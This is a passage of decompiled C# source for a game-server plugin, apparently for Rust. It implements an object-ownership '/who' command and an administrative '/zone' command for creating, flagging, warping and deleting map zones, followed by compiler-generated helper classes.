            GameObject obj2 = Helper.GetLookObject(Helper.GetLookRay(Sender), distance, -1);
            if (obj2 == null)
            {
                Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.Who.NotSeeAnything", Sender, null), 3f);
            }
            else
            {
                string newValue = Helper.NiceName(obj2.name);
                UserData bySteamID = null;
                StructureComponent component = obj2.GetComponent<StructureComponent>();
                DeployableObject obj3 = obj2.GetComponent<DeployableObject>();
                TakeDamage damage = obj2.GetComponent<TakeDamage>();
                if (component != null)
                {
                    bySteamID = Users.GetBySteamID(component._master.ownerID);
                }
                else
                {
                    if (obj3 == null)
                    {
                        Broadcast.Notice(Sender, "✘", Config.GetMessage("Command.Who.CannotOwned", Sender, null), 3f);
                        return;
                    }
                    bySteamID = Users.GetBySteamID(obj3.ownerID);
                }
                string str2 = Config.GetMessage("Command.Who.Condition", Sender, null);
                if (damage == null)
                {
                    str2 = "";
                }
                else
                {
                    str2 = str2.Replace("%OBJECT.HEALTH%", damage.health.ToString()).Replace("%OBJECT.MAXHEALTH%", damage.maxHealth.ToString());
                }
                if (bySteamID != null)
                {
                    string text = Config.GetMessage("Command.Who", Sender, null).Replace("%OBJECT.CONDITION%", str2).Replace("%OBJECT.NAME%", newValue).Replace("%OBJECT.OWNERNAME%", bySteamID.Username);
                    Broadcast.Message(Sender, text, null, 0f);
                    if (Sender.admin)
                    {
                        Broadcast.Message(Sender, "Steam ID: " + bySteamID.SteamID, "OBJECT OWNER", 0f);
                        Broadcast.Message(Sender, "Account Flags: " + bySteamID.Flags, "OBJECT OWNER", 0f);
                        Broadcast.Message(Sender, "Last connect date: " + bySteamID.LastConnectDate, "OBJECT OWNER", 0f);
                        Broadcast.Message(Sender, string.Concat(new object[] { "Last position: ", bySteamID.Position.x, ",", bySteamID.Position.y, ",", bySteamID.Position.z }), "OBJECT OWNER", 0f);
                        if (bySteamID.Clan != null)
                        {
                            Broadcast.Message(Sender, "Member of clan: " + bySteamID.Clan.Name + " <" + bySteamID.Clan.Abbr + ">", "OBJECT OWNER", 0f);
                        }
                    }
                }
                else
                {
                    Broadcast.Message(Sender, Config.GetMessage("Command.Who.NotOwned", Sender, null).Replace("%OBJECT.NAME%", newValue).Replace("%OBJECT.CONDITION%", str2), null, 0f);
                }
            }
        }

        public static void Zone(NetUser Sender, UserData userData, string Command, string[] Args)
        {
            WorldZone zone = null;
            WorldZone zone2 = Zones.Get(Sender.playerClient);
            if ((Args != null) && (Args.Length > 0))
            {
                if (Args[0].ToUpper().Equals("HIDE"))
                {
                    Broadcast.Message(Sender, "Markers of all zones has been removed.", null, 0f);
                    Zones.HidePoints();
                    return;
                }
                if (Args[0].ToUpper().Equals("SHOW"))
                {
                    Zones.HidePoints();
                    foreach (WorldZone zone3 in Zones.All.Values)
                    {
                        Zones.ShowPoints(zone3);
                    }
                    Broadcast.Message(Sender, "Markers of all zones has been created.", null, 0f);
                    return;
                }
                if (Args[0].ToUpper().Equals("LIST"))
                {
                    Broadcast.Message(Sender, "List of zones:", null, 0f);
                    foreach (string str in Zones.All.Keys)
                    {
                        Broadcast.Message(Sender, Zones.All[str].Name + " (" + str + ")", null, 0f);
                    }
                    return;
                }
                if (Args[0].ToUpper().Equals("SAVE"))
                {
                    Zones.SaveAsFile();
                    Broadcast.Message(Sender, "All zones saved.", null, 0f);
                    return;
                }
                if (Args[0].ToUpper().Equals("LOAD"))
                {
                    Zones.LoadAsFile();
                    Broadcast.Message(Sender, "All zones reloaded.", null, 0f);
                    return;
                }
                zone2 = Zones.Find(Args[0]);
            }
            if (Args.Length <= 1)
            {
                if (zone2 == null)
                {
                    Broadcast.Message(Sender, "Zone: Not defined", null, 0f);
                }
                else
                {
                    Broadcast.Message(Sender, "Zone: " + zone2.Name + " (" + zone2.Defname + ")", null, 0f);
                    Broadcast.Message(Sender, "Flags: " + zone2.Flags.ToString().Replace(" ", ""), null, 0f);
                    Broadcast.Message(Sender, "Center: " + zone2.Center, null, 0f);
                    Broadcast.Message(Sender, string.Concat(new object[] { "Points: ", zone2.Points.Count, ", Spawns: ", zone2.Spawns.Count }), null, 0f);
                    if (zone2.WarpZone != null)
                    {
                        Broadcast.Message(Sender, "Warp Zone: " + zone2.WarpZone.Defname, null, 0f);
                        Broadcast.Message(Sender, "Warp Time: " + zone2.WarpTime, null, 0f);
                    }
                }
            }
            else
            {
                string str2 = Args[1].ToUpper().Trim();
                switch (str2)
                {
                    case "NEW":
                        if (Zones.IsBuild)
                        {
                            Broadcast.Message(Sender, "You cannot create new zone because have not completed previous zone.", null, 0f);
                            Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save a previous not completed zone.", null, 0f);
                            return;
                        }
                        if (!Zones.BuildNew(Args[0]))
                        {
                            Broadcast.Message(Sender, "Zone with name \"" + Args[0] + "\" already exists.", null, 0f);
                            return;
                        }
                        Broadcast.Notice(Sender, "✎", "You starting to create " + Zones.LastZone.Name + " zone", 5f);
                        Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" mark\" to adding point for zone.", null, 0f);
                        return;

                    case "POINT":
                    case "MARK":
                        if (!Zones.IsBuild)
                        {
                            Broadcast.Message(Sender, "You cannot mark point because you not in creating zone.", null, 0f);
                            Broadcast.Message(Sender, "Use \"/zone <name> new\" for start creating new zone.", null, 0f);
                            return;
                        }
                        Zones.BuildMark(Sender.playerClient.lastKnownPosition);
                        Broadcast.Notice(Sender, "✎", "Point was added for \"" + Zones.LastZone.Name + "\" zone", 5f);
                        return;

                    case "SAVE":
                    {
                        if (!Zones.IsBuild)
                        {
                            Broadcast.Message(Sender, "You cannot save zone because you not in creating zone.", null, 0f);
                            Broadcast.Message(Sender, "Use \"/zone <name> new\" for start creating new zone.", null, 0f);
                            return;
                        }
                        string name = Zones.LastZone.Name;
                        if (!Zones.BuildSave())
                        {
                            Broadcast.Notice(Sender, "✎", "Error of creation zone \"" + name + "\", no points.", 5f);
                            return;
                        }
                        Broadcast.Notice(Sender, "✎", "Zone \"" + name + "\" a successfully created.", 5f);
                        return;
                    }
                    case "SHOW":
                        if (Zones.IsBuild || (zone2 == null))
                        {
                            break;
                        }
                        Zones.ShowPoints(zone2);
                        return;

                    case "GO":
                        if (zone2 != null)
                        {
                            if (Zones.IsBuild)
                            {
                                Broadcast.Message(Sender, "You cannot teleport to zone because have not completed new zone.", null, 0f);
                                Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
                                return;
                            }
                            if (zone2.Spawns.Count == 0)
                            {
                                Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not have spawn points for teleport.", 5f);
                                return;
                            }
                            int num = UnityEngine.Random.Range(0, zone2.Spawns.Count);
                            Helper.TeleportTo(Sender, zone2.Spawns[num]);
                            return;
                        }
                        Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not exists", 5f);
                        return;

                    case "DELETE":
                    case "REMOVE":
                        if (zone2 != null)
                        {
                            if (Zones.IsBuild)
                            {
                                Broadcast.Message(Sender, "You cannot delete zone because have not completed new zone.", null, 0f);
                                Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
                                return;
                            }
                            Broadcast.Notice(Sender, "✎", "Zone \"" + zone2.Name + "\" has been removed.", 5f);
                            Zones.Delete(zone2);
                            return;
                        }
                        Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not exists", 5f);
                        return;

                    case "SPAWN":
                    case "SPAWNS":
                    case "RAD":
                    case "RADIATION":
                    case "SAFE":
                    case "PVP":
                    case "DECAY":
                    case "BUILD":
                    case "TRADE":
                    case "EVENT":
                    case "CRAFT":
                    case "NOENTER":
                    case "NOLEAVE":
                        if (zone2 != null)
                        {
                            if (Zones.IsBuild)
                            {
                                Broadcast.Message(Sender, "Please complete new zone before manage other zones.", null, 0f);
                                Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
                                return;
                            }
                            if (str2.Equals("SPAWN"))
                            {
                                Vector3 position = Sender.playerClient.controllable.character.transform.position;
                                zone2.Spawns.Add(position);
                                Broadcast.Notice(Sender, "✎", "Added new spawn for zone \"" + zone2.Name + "\" at " + position.AsString(), 5f);
                            }
                            if (str2.Equals("SPAWNS"))
                            {
                                Broadcast.Message(Sender, string.Concat(new object[] { "Zone \"", zone2.Name, "\" have ", zone2.Spawns.Count, " spawn(s)." }), null, 0f);
                                for (int i = 0; i < zone2.Spawns.Count; i++)
                                {
                                    Broadcast.Message(Sender, string.Concat(new object[] { "Spawn #", i, ": ", zone2.Spawns[i].AsString() }), null, 0f);
                                }
                            }
                            if (str2.Equals("RAD") || str2.Equals("RADIATION"))
                            {
                                if (zone2.Radiation)
                                {
                                    zone2.Flags ^= ZoneFlags.radiation;
                                }
                                else
                                {
                                    zone2.Flags |= ZoneFlags.radiation;
                                }
                                Broadcast.Notice(Sender, "✎", "Zone \"" + zone2.Name + "\" now " + (zone2.Radiation ? "with" : "without") + " radiation.", 5f);
                            }
                            if (str2.Equals("SAFE"))
                            {
                                if (zone2.Safe)
                                {
                                    zone2.Flags ^= ZoneFlags.safe;
                                }
                                else
                                {
                                    zone2.Flags |= ZoneFlags.safe;
                                }
                                Broadcast.Notice(Sender, "✎", "Zone \"" + zone2.Name + "\" now " + (zone2.Safe ? "with" : "without") + " safe.", 5f);
                            }
                            if (str2.Equals("PVP"))
                            {
                                if (zone2.NoPvP)
                                {
                                    zone2.Flags ^= ZoneFlags.nopvp;
                                }
                                else
                                {
                                    zone2.Flags |= ZoneFlags.nopvp;
                                }
                                Broadcast.Notice(Sender, "✎", "Zone \"" + zone2.Name + "\" now " + (zone2.NoPvP ? "without" : "with") + " PvP.", 5f);
                            }
                            if (str2.Equals("DECAY"))
                            {
                                if (zone2.NoDecay)
                                {
                                    zone2.Flags ^= ZoneFlags.nodecay;
                                }
                                else
                                {
                                    zone2.Flags |= ZoneFlags.nodecay;
                                }
                                Broadcast.Notice(Sender, "✎", "Zone \"" + zone2.Name + "\" now " + (zone2.NoDecay ? "without" : "with") + " decay.", 5f);
                            }
                            if (str2.Equals("BUILD"))
                            {
                                if (zone2.NoBuild)
                                {
                                    zone2.Flags ^= ZoneFlags.nobuild;
                                }
                                else
                                {
                                    zone2.Flags |= ZoneFlags.nobuild;
                                }
                                Broadcast.Notice(Sender, "✎", "Zone \"" + zone2.Name + "\" now " + (zone2.NoBuild ? "without" : "with") + " build.", 5f);
                            }
                            if (str2.Equals("TRADE"))
                            {
                                if (zone2.CanTrade)
                                {
                                    zone2.Flags ^= ZoneFlags.trade;
                                }
                                else
                                {
                                    zone2.Flags |= ZoneFlags.trade;
                                }
                                Broadcast.Notice(Sender, "✎", "Zone \"" + zone2.Name + "\" now " + (zone2.CanTrade ? "with" : "without") + " trade.", 5f);
                            }
                            if (str2.Equals("EVENT"))
                            {
                                if (zone2.CanTrade)
                                {
                                    zone2.Flags ^= ZoneFlags.events;
                                }
                                else
                                {
                                    zone2.Flags |= ZoneFlags.events;
                                }
                                Broadcast.Notice(Sender, "✎", "Zone \"" + zone2.Name + "\" now " + (zone2.CanTrade ? "with" : "without") + " event.", 5f);
                            }
                            if (str2.Equals("CRAFT"))
                            {
                                if (zone2.NoCraft)
                                {
                                    zone2.Flags ^= ZoneFlags.nocraft;
                                }
                                else
                                {
                                    zone2.Flags |= ZoneFlags.nocraft;
                                }
                                Broadcast.Notice(Sender, "✎", "Zone \"" + zone2.Name + "\" now " + (zone2.CanTrade ? "with" : "without") + " craft.", 5f);
                            }
                            if (str2.Equals("NOENTER"))
                            {
                                if (zone2.NoEnter)
                                {
                                    zone2.Flags ^= ZoneFlags.noenter;
                                }
                                else
                                {
                                    zone2.Flags |= ZoneFlags.noenter;
                                }
                                Broadcast.Notice(Sender, "✎", "Players now " + (zone2.NoEnter ? "cannot" : "can") + " enter into \"" + zone2.Name + "\" zone.", 5f);
                            }
                            if (str2.Equals("NOLEAVE"))
                            {
                                if (zone2.NoLeave)
                                {
                                    zone2.Flags ^= ZoneFlags.noleave;
                                }
                                else
                                {
                                    zone2.Flags |= ZoneFlags.noleave;
                                }
                                Broadcast.Notice(Sender, "✎", "Players now " + (zone2.NoLeave ? "cannot" : "can") + " leave from \"" + zone2.Name + "\" zone.", 5f);
                            }
                            Zones.SaveAsFile();
                            return;
                        }
                        Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not exists", 5f);
                        return;

                    case "COMMAND":
                    case "CMD":
                        if (zone2 != null)
                        {
                            if (Zones.IsBuild)
                            {
                                Broadcast.Message(Sender, "Please complete new zone before manage other zones.", null, 0f);
                                Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
                                return;
                            }
                            if (Args.Length < 2)
                            {
                                Broadcast.Message(Sender, "You must enter command name for enable/disable to use in this zone.", null, 0f);
                                return;
                            }
                            if (zone2.ForbiddenCommand.Contains<string>(Args[2]))
                            {
                                zone2.ForbiddenCommand = zone2.ForbiddenCommand.Remove<string>(Args[2]);
                                Broadcast.Notice(Sender, "✎", "Now command \"" + Args[2] + "\" CAN be used in a zone \"" + zone2.Name + "\"", 5f);
                                return;
                            }
                            zone2.ForbiddenCommand = zone2.ForbiddenCommand.Add<string>(Args[2]);
                            Broadcast.Notice(Sender, "✎", "Now command \"" + Args[2] + "\" FORBIDDEN to use in a zone \"" + zone2.Name + "\"", 5f);
                            return;
                        }
                        Broadcast.Notice(Sender, "✘", "Zone with name \"" + Args[0] + "\" not exists", 5f);
                        return;

                    case "NAME":
                        if ((zone2 != null) || Zones.IsBuild)
                        {
                            if (Args.Length < 2)
                            {
                                Broadcast.Message(Sender, "You must enter new name of zone for change.", null, 0f);
                                return;
                            }
                            if (Zones.IsBuild)
                            {
                                Zones.LastZone.Name = Args[2];
                                Broadcast.Notice(Sender, "✎", "Current building zone now named \"" + Zones.LastZone.Name + "\".", 5f);
                                return;
                            }
                            zone2.Name = Args[2];
                            Broadcast.Notice(Sender, "✎", "Zone \"" + zone2.Defname + "\" now named of \"" + zone2.Name + "\".", 5f);
                            return;
                        }
                        Broadcast.Notice(Sender, "✘", "Zone with name \"" + Args[0] + "\" not exists", 5f);
                        return;

                    case "WARP":
                        if (zone2 != null)
                        {
                            if (Zones.IsBuild)
                            {
                                Broadcast.Message(Sender, "Please complete new zone before manage other zones.", null, 0f);
                                Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
                                return;
                            }
                            if (Args.Length < 2)
                            {
                                Broadcast.Message(Sender, "You must enter defname of other zone for create warp.", null, 0f);
                                return;
                            }
                            zone = Zones.Find(Args[2]);
                            if (zone == null)
                            {
                                Broadcast.Notice(Sender, "✘", "Warp zone " + Args[2] + " not exists.", 5f);
                                return;
                            }
                            zone.WarpZone = zone2;
                            zone2.WarpZone = zone;
                            Broadcast.Notice(Sender, "✎", "Zones \"" + zone.Name + "\" and \"" + zone2.Name + "\" now linked for warp.", 5f);
                            return;
                        }
                        Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not exists", 5f);
                        return;

                    case "UNWARP":
                        if (zone2 != null)
                        {
                            if (Zones.IsBuild)
                            {
                                Broadcast.Message(Sender, "Please complete new zone before manage other zones.", null, 0f);
                                Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
                                return;
                            }
                            if (zone2.WarpZone == null)
                            {
                                Broadcast.Notice(Sender, "✘", "Warp zone " + zone2.Defname + " not have warp.", 5f);
                                return;
                            }
                            Broadcast.Notice(Sender, "✎", "Zones \"" + zone2.WarpZone.Name + "\" and \"" + zone2.Name + "\" has been unlinked.", 5f);
                            zone2.WarpZone.WarpZone = null;
                            zone2.WarpZone = null;
                            return;
                        }
                        Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not exists", 5f);
                        return;

                    case "WARPTIME":
                        if (zone2 != null)
                        {
                            if (Zones.IsBuild)
                            {
                                Broadcast.Message(Sender, "Please complete new zone before manage other zones.", null, 0f);
                                Broadcast.Message(Sender, "Use \"/zone \"" + Zones.LastZone.Name + "\" save\" to save not completed zone.", null, 0f);
                                return;
                            }
                            if (zone2.WarpZone == null)
                            {
                                Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not have warp.", 5f);
                                return;
                            }
                            if (Args.Length < 2)
                            {
                                Broadcast.Message(Sender, "You must enter number of seconds to warp.", null, 0f);
                                return;
                            }
                            long.TryParse(Args[2], out zone2.WarpTime);
                            if (zone2.WarpTime > 0L)
                            {
                                Broadcast.Notice(Sender, "✎", string.Concat(new object[] { "You set ", zone2.WarpTime, " seconds to warp for \"", zone2.Name, "\" zone." }), 5f);
                                return;
                            }
                            Broadcast.Notice(Sender, "✎", "Zone \"" + zone2.Name + "\" now without warp time.", 5f);
                            return;
                        }
                        Broadcast.Notice(Sender, "✘", "Zone " + Args[0] + " not exists", 5f);
                        return;

                    default:
                        Broadcast.Notice(Sender, "✘", Config.GetMessageCommand("Command.InvalidSyntax", Command, null), 5f);
                        break;
                }
            }
        }

        [CompilerGenerated]
        private sealed class Class10
        {
            public NetUser netUser_0;
            public string string_0;

            public bool method_0(Countdown countdown_0)
            {
                return (countdown_0.Command == this.string_0);
            }

            public bool method_1(EventTimer eventTimer_0)
            {
                if ((eventTimer_0.Sender != this.netUser_0) && (eventTimer_0.Target != this.netUser_0))
                {
                    return false;
                }
                return (eventTimer_0.Command == this.string_0);
            }
        }

        [CompilerGenerated]
        private sealed class Class11
        {
            public NetUser netUser_0;
            public string string_0;

            public bool method_0(Countdown countdown_0)
            {
                return (countdown_0.Command == this.string_0);
            }

            public bool method_1(EventTimer eventTimer_0)
            {
                return ((eventTimer_0.Sender == this.netUser_0) && (eventTimer_0.Command == this.string_0));
            }

            public bool method_2(EventTimer eventTimer_0)
            {
                return ((eventTimer_0.Sender == this.netUser_0) && (eventTimer_0.Command == this.string_0));
            }
        }

        [CompilerGenerated]
        private sealed class Class12
        {
            public string string_0;

            public bool method_0(PlayerClient playerClient_0)
            {
                return (playerClient_0.netPlayer.externalIP == this.string_0);
            }
        }

        [CompilerGenerated]
        private sealed class Class4
        {
            public string string_0;

            public bool method_0(string string_1)
            {
                if (!string_1.Replace("=!", "=").Contains("=" + this.string_0 + "="))
                {
                    return string_1.Contains("=." + this.string_0 + "=");
                }
                return true;
            }

            public bool method_1(string string_1)
            {
                if (!string_1.Contains("=" + this.string_0 + "="))
                {
                    return string_1.Contains("=." + this.string_0 + "=");
                }
                return true;
            }

            public bool method_2(string string_1)
            {
                return string_1.Contains("=." + this.string_0 + "=");
            }
        }

        [CompilerGenerated]
        private sealed class Class5
        {
            public string[] string_0;

            public bool method_0(string string_1)
            {
                return string_1.Contains("=" + this.string_0[0] + "=");
            }

            public bool method_1(string string_1)
            {
                return string_1.Contains("=." + this.string_0[0] + "=");
            }
        }

        [CompilerGenerated]
        private sealed class Class6
        {
            public string string_0;

            public bool method_0(Countdown countdown_0)
            {
                return (countdown_0.Command == this.string_0);
            }
        }

        [CompilerGenerated]
        private sealed class Class7
        {
            public NetUser netUser_0;
            public string string_0;
            public UserData userData_0;

            public bool method_0(ClanLevel clanLevel_0)
            {
                return (clanLevel_0.RequireLevel == this.userData_0.Clan.Level.Id);
            }

            public bool method_1(Countdown countdown_0)
            {
                return (countdown_0.Command == this.string_0);
            }

            public bool method_2(EventTimer eventTimer_0)
            {
                return ((eventTimer_0.Sender == this.netUser_0) && (eventTimer_0.Command == this.string_0));
            }
        }

        [CompilerGenerated]
        private sealed class Class8
        {
            public Commands.Class7 class7_0;
            public int int_0;

            public bool method_0(ClanLevel clanLevel_0)
            {
                return (clanLevel_0.Id == this.int_0);
            }
        }

        [CompilerGenerated]
        private sealed class Class9
        {
            public NetUser netUser_0;
            public string string_0;

            public bool method_0(Countdown countdown_0)
            {
                return (countdown_0.Command == this.string_0);
            }

            public bool method_1(EventTimer eventTimer_0)
            {
                return ((eventTimer_0.Sender == this.netUser_0) && (eventTimer_0.Command == this.string_0));
            }
        }
    }
}

